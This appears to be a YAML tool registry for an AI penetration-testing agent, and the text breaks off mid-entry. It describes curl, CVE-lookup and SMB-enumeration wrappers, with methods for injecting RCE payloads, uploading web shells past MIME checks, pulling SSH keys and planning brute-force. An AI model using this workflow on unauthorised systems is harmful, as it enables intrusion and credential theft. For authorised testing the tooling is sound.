version: '2.0'
updated_at: '2026-02-23T10:35:45Z'
tools:
  curl:
    name: curl
    version: '8.18'
    description: 'HTTP client (curl 8.18.0 with HTTP/2, HTTP/3, NTLM, Kerberos support) wrapped in 5 specialized methods:
      request (any HTTP method with timing/debug), inject (RCE payload delivery with {PAYLOAD} placeholder and auto-encoding),
      upload (multipart file upload for web shells), download (small files as base64), and download_to_file (large files with
      auto .gz decompression). Returns structured response data: status code, parsed headers, body (50KB cap), timing breakdown
      (DNS/connect/TLS/TTFB/total), and error classification. Default User-Agent mimics Chrome on Windows. For login forms
      and JS pages, use playwright-mcp instead.'
    image: ghcr.io/silicon-works/mcp-tools-curl:latest
    image_size_mb: 100
    capabilities:
    - http_requests
    - file_download
    - exploit_testing
    - api_interaction
    see_also:
    - playwright-mcp
    - ffuf
    - zap
    routing:
      use_for:
      - make a single HTTP request to test an endpoint or check headers
      - deliver exploit payloads to web RCE endpoints with auto-encoding
      - upload web shells or malicious files via multipart form
      - download wordlists or exploit scripts to session directory
      - interact with a deployed web shell via command injection
      - check server response headers for version fingerprinting
      - send POST data to test for SQL injection or command injection
      - download files from target (configs SSH keys databases)
      - API request with authentication cookies or bearer tokens
      never_use_for:
      - directory brute-forcing
      - web fuzzing
      - automated scanning
      - login form filling
      - JavaScript rendered pages
      - pages that return empty bodies
      triggers:
      - download wordlist
      - get rockyou
      - fetch wordlist
      - download to session
      - api request
      - exploit payload
      prefer_over: []
    warnings:
    - Returns raw HTTP response - does NOT execute JavaScript
    - If response body is empty, the page likely requires JavaScript - use playwright-mcp instead
    - For login forms, playwright-mcp is usually better (handles cookies, CSRF, JS validation)
    - Cannot see rendered page content - use playwright-mcp browser_snapshot for that
    phases:
    - reconnaissance
    - enumeration
    - exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 128
      cpu: 0.25
    methods:
      request:
        description: Make an HTTP request with any method (GET/POST/PUT/DELETE/HEAD/OPTIONS/PATCH). Uses curl -s -S -i under
          the hood with response header parsing, redirect following (up to 10), and structured timing breakdown. Returns parsed
          status code, response headers as dict, body text (capped at 50KB), and timing (DNS lookup, TCP connect, TLS handshake,
          TTFB, total in ms, remote IP/port). Supports cookies, basic auth, custom headers, SSL bypass, and 4 debug levels.
          Body is NOT returned as base64 by default — use raw_response=true for binary content.
        when_to_use: 'For any single HTTP request: testing an endpoint, checking response headers, verifying a vulnerability,
          sending API calls, or confirming exploit success. Common pentest uses: (1) Check server headers for version info
          (HEAD request), (2) Test for open redirects or SSRF by checking redirect chains, (3) Send POST data to test for
          injection, (4) Verify web shell was uploaded by requesting it, (5) Interact with REST APIs. Use inject method instead
          when you need automatic payload encoding for RCE. Use playwright-mcp for JavaScript-rendered pages or when response
          body is empty.'
        params:
          url:
            type: string
            required: true
            description: Target URL
          method:
            type: enum
            values:
            - GET
            - POST
            - PUT
            - DELETE
            - HEAD
            - OPTIONS
            - PATCH
            default: GET
            description: HTTP method
          headers:
            type:
            - object
            - array
            description: 'Custom headers as key-value pairs (object) or array of ''Header: value'' strings'
          data:
            type: string
            description: Request body data
          body:
            type: string
            description: Request body data (alias for 'data')
          follow_redirects:
            type: boolean
            default: true
            description: Follow HTTP redirects
          timeout:
            type: integer
            default: 30
            description: Request timeout in seconds
          connect_timeout:
            type: integer
            default: 10
            description: Connection timeout in seconds
          insecure:
            type: boolean
            default: false
            description: Skip SSL certificate verification
          user_agent:
            type: string
            description: Custom User-Agent header
          cookie:
            type: string
            description: Cookie header value
          auth:
            type: string
            description: Basic auth in user:password format
          debug_level:
            type: integer
            enum:
            - 0
            - 1
            - 2
            - 3
            default: 0
            description: 'Debug level: 0=none, 1=request headers, 2=verbose output, 3=full trace'
          raw_response:
            type: boolean
            default: false
            description: Return raw binary response as base64 (for binary downloads)
        returns:
          status_code:
            type: integer
            description: HTTP response status code
          headers:
            type: object
            description: Response headers
          body:
            type: string
            description: Response body
          body_length:
            type: integer
            description: Length of response body in bytes
          timing:
            type: object
            description: Request timing breakdown
            properties:
              dns_lookup_ms:
                type: integer
                description: DNS lookup time in milliseconds
              connect_ms:
                type: integer
                description: TCP connection time in milliseconds
              tls_handshake_ms:
                type: integer
                description: TLS handshake time in milliseconds
              first_byte_ms:
                type: integer
                description: Time to first byte in milliseconds
              total_ms:
                type: integer
                description: Total request time in milliseconds
              remote_ip:
                type: string
                description: IP address of the remote server
              remote_port:
                type: integer
                description: Port of the remote server
          debug:
            type: object
            description: Debug information (when debug_level >= 1)
            properties:
              request_headers:
                type: object
                description: Headers sent in the request
              verbose_output:
                type: string
                description: Full verbose output (debug_level >= 2)
          error:
            type: object
            description: Error details (on failure)
            properties:
              type:
                type: string
                description: Error type (e.g., 'connection_refused', 'timeout', 'could_not_resolve_host')
              message:
                type: string
                description: Human-readable error message
              curl_exit_code:
                type: integer
                description: Curl exit code
      download:
        description: Download a file from a URL and return contents as base64-encoded string. Uses curl -s -S -L (follows
          redirects). Filename extracted from URL path. For large files (>10MB), use download_to_file instead — this method
          loads the entire file into memory and base64-encodes it.
        when_to_use: 'For downloading small files (<10MB) that you need to inspect or process: exploit scripts, configuration
          files, SSH keys, small binaries. The base64 content can be decoded and written to disk. For wordlists, large binaries,
          or files >10MB, use download_to_file instead (writes directly to disk).'
        params:
          url:
            type: string
            required: true
            description: URL to download from
          timeout:
            type: integer
            default: 120
            description: Download timeout in seconds
          insecure:
            type: boolean
            default: false
            description: Skip SSL certificate verification
        returns:
          filename:
            type: string
            description: Extracted filename
          size_bytes:
            type: integer
            description: File size in bytes
          content_base64:
            type: string
            description: File contents as base64
      download_to_file:
        description: Download a large file directly to a filesystem path using curl -o (no memory buffering). Follows redirects,
          shows progress bar. Auto-decompresses .gz files when decompress=true (default). Creates parent directories automatically.
          For text files (.txt), counts lines after download. 10-minute default timeout for large files.
        when_to_use: 'For downloading wordlists, large exploit tools, or binaries directly to disk. Common workflow: (1) Use
          web_search to find a wordlist URL (e.g., rockyou.txt, SecLists), (2) download_to_file to save to /session/wordlists/.
          Example: url=''https://github.com/.../rockyou.txt.gz'', output_path=''/session/wordlists/rockyou.txt'' (auto-decompresses
          .gz). Also useful for downloading large exploit scripts or toolkits that need to be saved locally before execution.'
        params:
          url:
            type: string
            required: true
            description: URL to download from
          output_path:
            type: string
            required: true
            description: Path to save file (e.g., /session/wordlists/rockyou.txt)
          timeout:
            type: integer
            default: 600
            description: Download timeout in seconds (default 10 minutes for large files)
          insecure:
            type: boolean
            default: false
            description: Skip SSL certificate verification
          decompress:
            type: boolean
            default: true
            description: Auto-decompress .gz files after download
        returns:
          output_path:
            type: string
            description: Path where file was saved
          size_bytes:
            type: integer
            description: File size in bytes
          size_mb:
            type: number
            description: File size in MB
          line_count:
            type: integer
            description: Number of lines (for text files)
          decompressed:
            type: boolean
            description: Whether file was decompressed
      inject:
        description: Send a command to a web RCE endpoint via {PAYLOAD} placeholder substitution with automatic encoding (URL,
          double-URL, base64, or none). Replaces {PAYLOAD} in both URL and POST body with the encoded command. Extracts command
          output from the response using optional start/end markers, strips HTML tags by default. Built on the request method
          — inherits timing, error handling, and redirect following.
        when_to_use: 'For exploiting confirmed web RCE vulnerabilities — command injection, PHP code injection, template injection,
          etc. Typical workflow: (1) Confirm RCE via request method with manual payload, (2) Switch to inject for repeated
          command execution with auto-encoding. The {PAYLOAD} placeholder goes in the URL for GET-based injection (e.g., url=''http://target/vuln.php?cmd={PAYLOAD}'')
          or in the POST body (data=''cmd={PAYLOAD}''). Use output_markers to extract clean output from noisy HTML responses.
          Use encoding=''double-url'' for WAF bypass, ''base64'' for payloads with special characters.'
        params:
          url:
            type: string
            required: true
            description: Target URL (use {PAYLOAD} as placeholder for command)
          command:
            type: string
            required: true
            description: Command to execute
          method:
            type: enum
            values:
            - GET
            - POST
            default: GET
            description: HTTP method
          encoding:
            type: enum
            values:
            - url
            - double-url
            - base64
            - none
            default: url
            description: Payload encoding method
          output_markers:
            type: object
            description: 'Start/end markers to extract output: {start: str, end: str}'
          strip_html:
            type: boolean
            default: true
            description: Strip HTML tags from output
          headers:
            type:
            - object
            - array
            description: 'Custom headers as key-value pairs (object) or array of ''Header: value'' strings'
          data:
            type: string
            description: POST body (use {PAYLOAD} as placeholder)
          body:
            type: string
            description: POST body (alias for 'data', use {PAYLOAD} as placeholder)
          cookie:
            type: string
            description: Cookie header value
          timeout:
            type: integer
            default: 30
            description: Request timeout in seconds
          connect_timeout:
            type: integer
            default: 10
            description: Connection timeout in seconds
          insecure:
            type: boolean
            default: false
            description: Skip SSL certificate verification
          debug_level:
            type: integer
            enum:
            - 0
            - 1
            - 2
            - 3
            default: 0
            description: 'Debug level: 0=none, 1=request headers, 2=verbose output, 3=full trace'
        returns:
          output:
            type: string
            description: Extracted command output
          status_code:
            type: integer
            description: HTTP response status code
          raw_body_length:
            type: integer
            description: Length of raw response body
          timing:
            type: object
            description: Request timing breakdown (same as request method)
          debug:
            type: object
            description: Debug information (when debug_level >= 1)
          error:
            type: object
            description: Error details (on failure)
      upload:
        description: Upload a file via multipart/form-data POST request. Content can be plain text (for web shells, scripts)
          or base64-encoded (for binary files). Uses curl -F with automatic temp file creation and cleanup. Supports custom
          MIME type spoofing, extra form fields, cookies, and custom headers. Returns parsed response including status code,
          headers, body, and timing.
        when_to_use: 'For exploiting file upload vulnerabilities: (1) Upload a PHP/JSP/ASP web shell through a file upload
          form, (2) Upload a reverse shell binary, (3) Exploit unrestricted file upload for RCE. You need to know the form
          field name (inspect the HTML form for the <input type=''file'' name=''...''> attribute). Common field names: ''file'',
          ''upload'', ''avatar'', ''image'', ''attachment''. Set content_type to ''image/jpeg'' or ''image/png'' to bypass
          MIME type checks. Use extra_fields for additional required form parameters.'
        params:
          url:
            type: string
            required: true
            description: Target upload URL
          file_field:
            type: string
            required: true
            description: Form field name for file (e.g., 'file', 'upload', 'avatar')
          filename:
            type: string
            required: true
            description: Filename to send (e.g., 'shell.php', 'image.png')
          content:
            type: string
            required: true
            description: File content (plain text or base64 encoded)
          content_type:
            type: string
            default: application/octet-stream
            description: MIME type for the uploaded file
          is_base64:
            type: boolean
            default: false
            description: Whether content is base64 encoded
          extra_fields:
            type: object
            description: Additional form fields as key-value pairs
          headers:
            type:
            - object
            - array
            description: 'Custom HTTP headers as key-value pairs (object) or array of ''Header: value'' strings'
          cookie:
            type: string
            description: Cookie header value
          timeout:
            type: integer
            default: 60
            description: Upload timeout in seconds
          connect_timeout:
            type: integer
            default: 10
            description: Connection timeout in seconds
          insecure:
            type: boolean
            default: false
            description: Skip SSL certificate verification
          debug_level:
            type: integer
            enum:
            - 0
            - 1
            - 2
            - 3
            default: 0
            description: 'Debug level: 0=none, 1=request headers, 2=verbose output, 3=full trace'
        returns:
          status_code:
            type: integer
            description: HTTP response status code
          filename:
            type: string
            description: Uploaded filename
          file_size:
            type: integer
            description: Size of uploaded content
          body:
            type: string
            description: Response body
          body_length:
            type: integer
            description: Length of response body
          timing:
            type: object
            description: Request timing breakdown (same as request method)
          debug:
            type: object
            description: Debug information (when debug_level >= 1)
          error:
            type: object
            description: Error details (on failure)
  cve-lookup:
    name: cve-lookup
    version: '1.0'
    description: CVE vulnerability research tool using the NVD (National Vulnerability Database) API v2.0. Provides detailed
      CVE lookups with CVSS v3.1/v3.0/v2 scoring, affected product versions (CPE matching), CWE weakness classification, and
      reference links. Includes keyword-based CVE search with built-in CPE mapping for 22 common products (Apache, Nginx,
      OpenSSH, MySQL, PostgreSQL, WordPress, etc.), version filtering, severity filtering, and year filtering. Also finds
      exploit references (ExploitDB, GitHub PoCs, PacketStorm, Metasploit) from NVD reference links. Supports optional NVD_API_KEY
      environment variable for higher rate limits (50 req/30s vs 5 req/30s).
    image: ghcr.io/silicon-works/mcp-tools-cve-lookup:latest
    image_size_mb: 100
    capabilities:
    - cve_lookup
    - vulnerability_search
    - exploit_research
    - cvss_scoring
    phases:
    - enumeration
    - exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 128
      cpu: 0.25
    routing:
      use_for:
      - look up CVE details including CVSS score and affected versions
      - search for CVEs affecting a specific product and version
      - find public exploits and PoCs for a CVE
      - check CVSS severity score for a vulnerability
      - find recent critical CVEs from the last week
      - research vulnerabilities for identified services
      - determine affected version range for a CVE
      - get CWE weakness classification for a vulnerability
      never_use_for:
      - active vulnerability scanning (use nuclei or nmap vuln)
      - exploit execution (use exploit-runner or metasploit)
      - port scanning (use nmap)
      - finding exploit code (use searchsploit for actual code)
      triggers:
      - CVE
      - vulnerability lookup
      - NVD
      - exploit search
      - CVSS
      - vulnerability research
      - what is CVE
      - affected versions
      prefer_over:
      - searchsploit
    environment:
      NVD_API_KEY:
        description: Optional NVD API key for higher rate limits
        required: false
    methods:
      lookup:
        description: 'Look up a specific CVE by ID from the NVD API v2.0. Returns comprehensive vulnerability details: English
          description, CVSS base score with severity rating (prefers v3.1 → falls back to v3.0 → v2.0), CVSS vector string
          for attack complexity analysis, affected products with vendor/product/version ranges parsed from CPE matching data,
          CWE weakness classification IDs, publication and last-modified dates, and up to 10 reference links (advisories,
          patches, PoCs). Automatically normalizes the CVE ID — accepts ''CVE-2024-32019'', ''cve-2024-32019'', or ''2024-32019''.'
        when_to_use: 'When you have a CVE ID and need to understand the vulnerability before exploitation. Common sources
          of CVE IDs: (1) nmap scripts (vuln, http-vuln-*) output CVE references, (2) nuclei scanner results include CVE IDs,
          (3) searchsploit results reference CVEs, (4) web application error pages or headers reveal version-specific CVEs.
          Use lookup to get: CVSS score for severity triage (CRITICAL ≥9.0 first), affected version ranges to confirm the
          target is vulnerable, CWE classification to understand the vulnerability class (e.g., CWE-79 = XSS, CWE-89 = SQLi),
          and reference links that may point to patches, advisories, or PoC code.'
        params:
          cve_id:
            type: string
            required: true
            description: CVE ID in any format — 'CVE-2024-32019', 'cve-2024-32019', or bare '2024-32019'. The CVE- prefix
              and uppercase are applied automatically. Must be a valid CVE ID that exists in NVD.
        returns:
          cve_id:
            type: string
            description: Normalized CVE identifier (uppercase with CVE- prefix)
          description:
            type: string
            description: English vulnerability description from NVD
          cvss_score:
            type: number
            description: CVSS base score (0.0-10.0). Null if no CVSS data available (rare for recent CVEs)
          cvss_severity:
            type: string
            description: 'Severity level: LOW (0.1-3.9), MEDIUM (4.0-6.9), HIGH (7.0-8.9), CRITICAL (9.0-10.0)'
          cvss_vector:
            type: string
            description: CVSS vector string (e.g., 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H') — describes attack vector,
              complexity, privileges, and impact
          affected_products:
            type: array
            description: Up to 10 affected products parsed from CPE data, each with vendor, product, version_start (inclusive),
              and version_end (exclusive or inclusive). Use to confirm target version falls within the vulnerable range.
          weaknesses:
            type: array
            description: CWE IDs (e.g., 'CWE-79', 'CWE-89') classifying the vulnerability type
          references:
            type: array
            description: Up to 10 reference links with URL, source, and tags (Patch, Exploit, Vendor Advisory, Third Party
              Advisory, etc.)
      search:
        description: 'Search NVD for CVEs matching a keyword with optional version, severity, and year filters. Uses NVD''s
          keywordSearch API which matches against CVE descriptions and product names. Returns a summary list of matching CVEs
          — each with CVE ID, CVSS score, severity, truncated description (300 chars), and publication date. Client-side version
          filtering compares the specified version against CPE version ranges (simple string comparison, not semver). Results
          capped at 100 from the API, further limited by the limit parameter. NVD rate limits apply: 5 requests per 30 seconds
          without API key, 50 with API key.'
        when_to_use: 'The standard workflow after nmap service_scan identifies software versions — search by product name
          to find known CVEs. Examples: after nmap finds ''Apache httpd 2.4.49'', search keyword=''apache'' version=''2.4.49''.
          After finding ''OpenSSH 7.2p2'', search keyword=''openssh'' version=''7.2''. Search tips: (1) Use simple product
          names: ''apache'' not ''Apache httpd 2.4.49 (Ubuntu)''. (2) Combine with severity=''CRITICAL'' or severity=''HIGH''
          to prioritize exploitable vulns. (3) Use year filter to focus on recent CVEs (older CVEs are more likely patched).
          (4) Version filtering is approximate — review results manually to confirm applicability. (5) For a specific CVE
          found in results, use lookup for full details. (6) Follow up with exploits method to check for public exploit code.'
        params:
          keyword:
            type: string
            required: true
            description: 'Product name or keyword to search. Use simple product names for best results: ''apache'', ''nginx'',
              ''openssh'', ''wordpress'', ''mysql'', ''postgresql'', ''tomcat'', ''jenkins'', ''redis'', ''elasticsearch'',
              ''drupal'', ''joomla'', ''php''. NVD matches against CVE descriptions, so general terms like ''buffer overflow''
              or ''remote code execution'' also work but return very broad results.'
          version:
            type: string
            description: Product version for client-side filtering against CPE version ranges. Simple string comparison (not
              semver) — '2.4.49' is compared against versionStartIncluding/versionEndExcluding ranges. Omit the version to
              see all CVEs for the product, then filter manually.
          severity:
            type: enum
            values:
            - LOW
            - MEDIUM
            - HIGH
            - CRITICAL
            description: Filter by CVSS v3 severity. During pentesting, start with CRITICAL to find the most exploitable vulns,
              then expand to HIGH if nothing actionable. MEDIUM and LOW are rarely worth pursuing unless no higher-severity
              options exist.
          limit:
            type: integer
            default: 20
            description: Maximum results to return (1-100). NVD API caps at 100 per request. Default 20 is usually sufficient
              — increase if searching broad terms like 'apache' where relevant results may be buried.
          year:
            type: integer
            description: Filter by publication year (e.g., 2024). Useful to focus on recent CVEs which are more likely to
              lack patches or have public exploits. Also useful for CTFs where challenge authors use CVEs from specific years.
        returns:
          cves:
            type: array
            description: 'Matching CVEs, each with: cve_id, cvss_score, cvss_severity, description (truncated to 300 chars),
              published date'
          total_results:
            type: integer
            description: Total matching CVEs in NVD (may be much larger than returned results — increase limit or add filters
              to narrow)
      recent:
        description: Get CVEs published in the last 7 days from NVD. Returns the same summary format as search — CVE ID, CVSS
          score, severity, truncated description, and publication date. Queries NVD with pubStartDate/pubEndDate for the last
          7-day window. Useful for zero-day awareness and checking if recently disclosed vulnerabilities affect identified
          targets. NVD rate limits apply.
        when_to_use: 'Two main scenarios: (1) At the start of an engagement, check for freshly disclosed CVEs in the target''s
          technology stack — recent CVEs are more likely unpatched. Filter by severity=''CRITICAL'' for the most impactful.
          (2) During long-running engagements, periodically check for new disclosures that may open new attack paths. Note:
          NVD publication can lag 24-72 hours behind the original disclosure, so very new vulnerabilities may not appear yet.'
        params:
          severity:
            type: enum
            values:
            - LOW
            - MEDIUM
            - HIGH
            - CRITICAL
            description: Filter by CVSS v3 severity. Use CRITICAL to find the most impactful recent disclosures. Without this
              filter, results include all severities including LOW which are rarely actionable.
          limit:
            type: integer
            default: 20
            description: Maximum results (1-100). 20 is usually sufficient for a weekly snapshot. Increase to 50-100 if filtering
              by CRITICAL severity, as there are typically few critical CVEs per week.
        returns:
          cves:
            type: array
            description: 'Recent CVEs from last 7 days, each with: cve_id, cvss_score, cvss_severity, description (truncated
              to 300 chars), published date'
          total_results:
            type: integer
            description: Total recent CVEs in the 7-day window (before severity filtering)
      exploits:
        description: 'Find known public exploits for a CVE by scanning its NVD reference links. Checks references for exploit-related
          indicators: ExploitDB URLs, GitHub repositories containing ''exploit'', ''poc'', or ''CVE'' in the path, PacketStorm
          URLs, 0day.today URLs, and Rapid7/Metasploit references. Also checks NVD''s reference tags for the ''Exploit'' tag.
          Returns matching exploit URLs grouped by source, plus ready-to-use follow-up commands: a searchsploit query (CVE
          number without ''CVE-'' prefix) and a Metasploit ''search cve:'' command. Note: this only finds exploits linked
          from NVD references — it does NOT search ExploitDB or GitHub directly. For comprehensive exploit search, follow
          up with the searchsploit tool.'
        when_to_use: 'After search or lookup identifies a CVE that affects the target, use this to determine if public exploit
          code exists before attempting manual exploitation. The workflow: (1) search for CVEs → (2) exploits to check for
          PoCs → (3) if ExploitDB found, use searchsploit get_exploit to retrieve the code → (4) if Metasploit found, use
          metasploit tool → (5) if GitHub PoC found, the URL is returned for manual review. This is a quick triage step —
          if no exploit references are found in NVD, the CVE may still have exploits that aren''t linked from NVD. Always
          follow up with searchsploit for a more thorough search.'
        params:
          cve_id:
            type: string
            required: true
            description: 'CVE ID to search exploits for. Accepts any format: ''CVE-2021-44228'', ''cve-2021-44228'', or ''2021-44228''.
              Normalized automatically.'
        returns:
          exploit_references:
            type: array
            description: URLs to exploit code or PoCs, each with url, source, and tags. Empty array if no exploit references
              found in NVD.
          exploit_sources:
            type: array
            description: 'Deduplicated list of sources with exploits: ''ExploitDB'', ''GitHub'', ''Metasploit'', ''PacketStorm''.
              Empty if none found.'
          searchsploit_query:
            type: string
            description: Ready-to-use query for the searchsploit tool's --cve flag (e.g., '2021-44228' for CVE-2021-44228).
              Use with searchsploit search.
          metasploit_search:
            type: string
            description: Ready-to-use Metasploit search command (e.g., 'search cve:CVE-2021-44228'). Use with metasploit tool.
  embedding:
    name: embedding
    version: '1.0'
    description: BGE-M3 embedding model for semantic search. Internal tool for tool discovery and experience matching.
    image: ghcr.io/silicon-works/mcp-tools-embedding:latest
    image_size_mb: 2500
    internal: true
    capabilities:
    - text_embedding
    - semantic_search
    - hybrid_scoring
    phases: []
    routing:
      use_for:
      - generate embeddings
      - semantic similarity
      - vector search
      triggers:
      - embedding
      - vector
      - semantic search
      never_use_for:
      - task: any pentest task
        reason: internal infrastructure tool, not for direct use
    methods:
      embed:
        description: Generate dense and sparse embeddings for text
        when_to_use: 'Internal: called by tool registry search and experience recording'
        params:
          texts:
            type: array
            required: true
            description: List of texts to embed
          return_sparse:
            type: boolean
            default: true
            description: Whether to return sparse lexical embeddings
        returns:
          dense:
            type: array
            description: Dense embeddings (1024 dimensions each)
          sparse:
            type: array
            description: Sparse embeddings as token->weight dicts
      hybrid_score:
        description: Compute hybrid similarity scores
        when_to_use: 'Internal: called during search ranking'
        params:
          query_dense:
            type: array
            required: true
            description: Query dense embedding
          query_sparse:
            type: object
            required: true
            description: Query sparse embedding
          corpus_dense:
            type: array
            required: true
            description: Corpus dense embeddings
          corpus_sparse:
            type: array
            required: true
            description: Corpus sparse embeddings
          dense_weight:
            type: number
            default: 0.4
            description: Weight for dense similarity
          sparse_weight:
            type: number
            default: 0.6
            description: Weight for sparse similarity
        returns:
          scores:
            type: array
            description: Hybrid similarity scores
      health:
        description: Health check for embedding service
        when_to_use: 'Internal: verify server availability'
        params: {}
        returns:
          status:
            type: string
            description: Server status (ok/error)
          model:
            type: string
            description: Model name
          dimensions:
            type: integer
            description: Embedding dimensions
  enum4linux-ng:
    name: enum4linux-ng
    version: 1.3.7
    description: 'Next-generation SMB/Windows/Samba enumeration tool (enum4linux-ng v1.3.7, Python rewrite of enum4linux.pl).
      Wraps Samba tools (nmblookup, net, rpcclient, smbclient) for automated enumeration of: SMB shares with access checks,
      users via RPC and RID cycling, groups with member lists, password policy, OS information, services, printers, NetBIOS
      names, and LDAP domain info (for DCs). Smart enumeration — checks SMB/LDAP accessibility first, skips inapplicable checks.
      Supports anonymous (null session), username/password, Kerberos ticket, and NTLM hash authentication. JSON/YAML output
      for structured parsing.'
    image: ghcr.io/silicon-works/mcp-tools-enum4linux-ng:latest
    image_size_mb: 150
    capabilities:
    - smb_enumeration
    - user_enumeration
    - share_enumeration
    - group_enumeration
    phases:
    - enumeration
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 256
      cpu: 0.5
    routing:
      use_for:
      - enumerate SMB shares users and groups on Windows or Samba targets
      - discover domain users via RID cycling through null sessions
      - check SMB share permissions and find readable writable shares
      - enumerate Windows password policy before brute-force attacks
      - get OS version and domain information from SMB service
      - enumerate Active Directory users and groups via SMB
      - find anonymous accessible SMB shares on port 445
      - enumerate Windows domain groups and their members
      never_use_for:
      - SMB exploitation like EternalBlue (use metasploit or exploit-runner)
      - port scanning (use nmap)
      - SMB password brute-force (use hydra)
      triggers:
      - SMB
      - enum4linux
      - Windows enumeration
      - shares
      - RID cycling
      - Samba
      - port 445
      - port 139
      - null session
      - domain users
      prefer_over:
      - nmap
    methods:
      enumerate:
        description: Comprehensive SMB enumeration combining shares (-S), users via RID cycling (-U), and groups (-G) into
          a single scan. Uses enum4linux-ng with JSON output (-oJ). Smart enumeration checks SMB accessibility first and skips
          inapplicable checks. If no specific modules are selected, defaults to -A (all simple enumeration). Returns parsed
          JSON with OS info, share list (name, type, comment), user list (username, RID), and group list (name, RID). Full
          raw JSON is also included for detailed analysis.
        when_to_use: 'The first tool to run after nmap discovers SMB on port 445 or 139. Start with this comprehensive scan
          to get an overview: what shares exist, what users are on the system, and what groups they belong to. Try anonymous
          (null session) first by omitting username/password — many SMB servers leak information without authentication. If
          null session fails, try with discovered credentials. The results feed into: (1) shares → look for readable/writable
          shares with sensitive files, (2) users → target for password brute-force with hydra, (3) groups → identify admin
          group members for privilege escalation.'
        params:
          target:
            type: string
            required: true
            description: Target IP or hostname with SMB running (port 445 or 139).
          username:
            type: string
            description: Username for authenticated enumeration. Omit for null session (anonymous). Use '' (empty string)
              explicitly for guest access.
          password:
            type: string
            description: Password for authenticated enumeration. Omit for null session.
          shares:
            type: boolean
            default: true
            description: Enumerate SMB shares (-S). Shows share name, type (Disk/IPC$/Printer), and comment.
          users:
            type: boolean
            default: true
            description: Enumerate users via RPC/RID cycling (-U). Discovers domain/local user accounts.
          groups:
            type: boolean
            default: true
            description: Enumerate groups (-G). Shows group names and RIDs. Use enum_groups for member lists.
          timeout:
            type: integer
            default: 300
            description: Timeout in seconds. 300s is usually sufficient. Increase for slow networks or large domains.
        returns:
          shares:
            type: array
            description: 'Discovered SMB shares, each with: name, type (Disk/IPC$/Printer), comment.'
          users:
            type: array
            description: 'Discovered user accounts, each with: username, RID (Relative Identifier).'
          groups:
            type: array
            description: 'Discovered groups, each with: name, RID.'
          os_info:
            type: object
            description: 'OS information from SMB: OS version, server type, domain/workgroup name.'
      enum_users:
        description: Enumerate user accounts via RID cycling (-U -R) on an SMB/Windows target. RID cycling iterates through
          Relative Identifiers to discover valid user accounts — even through null sessions where user listing via RPC may
          be blocked. Default range covers well-known RIDs (500=Administrator, 501=Guest, 502=krbtgt) and typical user RIDs
          (1000+). Uses JSON output for structured results. Each user includes username, RID, and domain.
        when_to_use: 'When you need a comprehensive user list from an SMB target, especially when the enumerate method didn''t
          find users (some servers block RPC user listing but allow RID lookups). The discovered usernames are essential for:
          (1) Password brute-force with hydra smb or hydra ssh, (2) Kerberoasting in Active Directory, (3) Password spraying.
          Well-known RIDs to look for: 500=Administrator (always exists), 501=Guest, 502=krbtgt (AD only). Expand rid_range
          to ''500-550,1000-5000'' for large domains with many users.'
        params:
          target:
            type: string
            required: true
            description: Target IP or hostname with SMB running.
          username:
            type: string
            description: Username for authenticated enumeration. Omit for null session.
          password:
            type: string
            description: Password for authenticated enumeration.
          rid_range:
            type: string
            default: 500-550,1000-1200
            description: 'RID range(s) to enumerate, comma-separated. Default ''500-550,1000-1200'' covers admin RIDs and
              first 200 user accounts. Well-known: 500=Administrator, 501=Guest, 502=krbtgt. Expand to ''500-550,1000-5000''
              for large domains.'
          timeout:
            type: integer
            default: 300
            description: Timeout in seconds.
        returns:
          users:
            type: array
            description: 'Discovered users, each with: username, rid (numeric RID), domain.'
          count:
            type: integer
            description: Number of users found.
      enum_shares:
        description: Enumerate SMB shares and check access permissions (-S). Lists all shared resources (disk shares, IPC$,
          printers) with share name, type, comment, and access mapping (readable/writable). Uses rpcclient and smbclient to
          enumerate and test access. Returns structured share data with access level information.
        when_to_use: 'After confirming SMB is running, to find accessible file shares. Key things to look for: (1) Non-default
          shares (anything besides ADMIN$, C$, IPC$, print$) — these often contain sensitive files. (2) Readable shares —
          may contain config files, credentials, backups. (3) Writable shares — can be used to plant web shells, backdoors,
          or exploit DLL hijacking. Common high-value shares: ''Users'', ''Documents'', ''Backups'', ''IT'', ''Scripts''.
          After finding readable shares, use impacket''s smbclient to browse and download files.'
        params:
          target:
            type: string
            required: true
            description: Target IP or hostname with SMB running.
          username:
            type: string
            description: Username for authenticated enumeration. Omit for null session. Authenticated enumeration reveals
              more shares and access details.
          password:
            type: string
            description: Password for authenticated enumeration.
          timeout:
            type: integer
            default: 300
            description: Timeout in seconds.
        returns:
          shares:
            type: array
            description: 'Discovered shares, each with: name, type (Disk/IPC$/Printer), comment (description), access (mapping/read/write
              permissions).'
          count:
            type: integer
            description: Number of shares found.
      enum_groups:
        description: Enumerate groups and their members via RPC (-G). Lists local and domain groups with RID and member usernames.
          Shows group membership hierarchy — critical for identifying who has administrative access. Uses rpcclient group
          enumeration.
        when_to_use: 'After user enumeration, to understand privilege levels. Key groups to look for: (1) ''Domain Admins''
          or ''Administrators'' — members have full control, (2) ''Remote Desktop Users'' — can RDP in, (3) ''Backup Operators''
          — can read any file, (4) ''Account Operators'' — can create/modify accounts. Group membership reveals privilege
          escalation paths: if a compromised user is in a privileged group, you already have elevated access.'
        params:
          target:
            type: string
            required: true
            description: Target IP or hostname with SMB running.
          username:
            type: string
            description: Username for authenticated enumeration. Authenticated sessions reveal more groups and membership
              details.
          password:
            type: string
            description: Password for authenticated enumeration.
          timeout:
            type: integer
            default: 300
            description: Timeout in seconds.
        returns:
          groups:
            type: array
            description: 'Discovered groups, each with: name, rid, members (list of member usernames/SIDs).'
          count:
            type: integer
            description: Number of groups found.
      enum_policy:
        description: Enumerate password policy and domain/OS information via RPC (-P -I). Returns password policy settings
          (min length, complexity, lockout threshold, lockout duration, max password age) and OS/domain info (OS version,
          domain name, server type). Uses rpcclient policyquery and srvinfo commands.
        when_to_use: 'Before password brute-force attacks, to understand what passwords are valid and avoid lockouts. Key
          policy fields: (1) ''Minimum password length'' — determines minimum wordlist entry length, (2) ''Account lockout
          threshold'' — how many failed attempts before lockout (0=no lockout), (3) ''Account lockout duration'' — how long
          lockout lasts. If lockout threshold is 0 or very high, aggressive brute-force is safe. If low (3-5 attempts), use
          careful password spraying instead. Password complexity requirements inform wordlist selection.'
        params:
          target:
            type: string
            required: true
            description: Target IP or hostname with SMB running.
          username:
            type: string
            description: Username for authenticated enumeration. Some targets only reveal policy to authenticated users.
          password:
